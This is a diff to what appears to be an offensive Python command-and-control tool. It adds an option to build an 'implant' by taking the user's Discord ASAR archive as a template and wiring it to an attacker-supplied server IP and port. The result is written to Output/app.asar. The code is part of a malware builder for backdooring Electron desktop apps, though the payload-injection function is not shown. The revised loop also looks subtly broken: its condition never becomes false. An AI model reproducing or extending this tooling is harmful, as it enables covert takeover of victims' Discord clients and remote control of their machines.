@@ -8,6 +8,7 @@ import readline
 import threading
 import uvicorn
 from Server.asargen import createAsarFile
+from Server.grabasar import grab_discord_asar
 import time
 from datetime import datetime
 import sys
@@ -258,15 +259,29 @@ def printHeader():
 def generateAsar():
     ADDRESS = input("Enter server IP address: ")
 
+    choice = ""
     asarFile = ""
 
-    while asarFile == "":
-        asarFile = input("Please provide an ASAR archive: ")
-        if os.path.exists(asarFile):
+    while not choice == "t" or not choice == "c":
+        choice = input("Implant from (t)emplte or (c)ustom? ")
+        
+        if choice == "t":
+            asarFile = grab_discord_asar()
             break
+        elif choice == "c":
+
+            while asarFile == "":
+                asarFile = input("Please provide an ASAR archive: ")
+                if os.path.exists(asarFile):
+                    break
+                else:
+                    print(f"{asarFile} is not a valid ASAR archive, please provide a valid ASAR archive.")
+                asarFile = ""
         else:
-            print(f"{asarFile} is not a valid ASAR archive, please provide a valid ASAR archive.")
-            asarFile = ""
+            print("Please select a valid option.")
+
+        choice = ""
+
 
     createAsarFile(asarFile, ADDRESS, PORT)
     print("Successfully created implant \"Output/app.asar!\"")
